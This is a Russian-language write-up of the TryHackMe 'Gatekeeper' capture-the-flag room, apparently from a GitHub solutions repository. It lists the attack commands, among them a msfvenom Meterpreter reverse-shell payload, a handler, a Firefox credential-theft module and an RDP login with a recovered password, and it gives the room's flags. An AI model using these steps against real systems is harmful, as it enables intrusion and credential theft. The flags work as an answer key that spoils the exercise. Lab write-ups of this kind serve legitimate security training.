[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Gatekeeper](https://tryhackme.com/r/room/gatekeeper) 

Всего 2 задания:
## Задание 1
Разверните машину, когда будете готовы освободить Gatekeeper.

**Записи не принимаются для этого задания**

### Ответьте на вопросы ниже
Ответ не требуется
```commandline
Ответ не нужен
```

## Задание 2
Победите Привратника, чтобы разорвать цепи. Но будьте осторожны, на другой стороне вас ждет огонь.

### Ответьте на вопросы ниже
Найдите и найдите флаг пользователя.
```commandline
nmap -sSCV -p- <IP>
nc <IP> 31337
smbclient -L //<IP>
smbclient -L \\\\<IP>\\Users
cd Share
dir
get gatekeeper.exe
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 39654138
!mona compare -f C:\mona\oscp\bytearray.bin -a 02AB19F8

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 EXITFUNC=thread -b “\x00\x0a” -f c
msfconsole 
use exploit/multi/handler
set LHOST <YOUR IP>
set PAYLOAD windows/meterpreter/reverse_tcp
run
sysinfo
ls
cat user.txt.txt
```
```commandline
{H4lf_W4y_Th3r3}
```
Найдите и найдите корневой флаг
```commandline
use post/multi/gather/firefox_creds
options
sessions
set SESSION 1
run
ls

sudo xfreerdp /u:mayor /p:8CL7O1N78MdrCIsV /cert:ignore /v:<IP>
```
```commandline
{Th3_M4y0r_C0ngr4tul4t3s_U}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)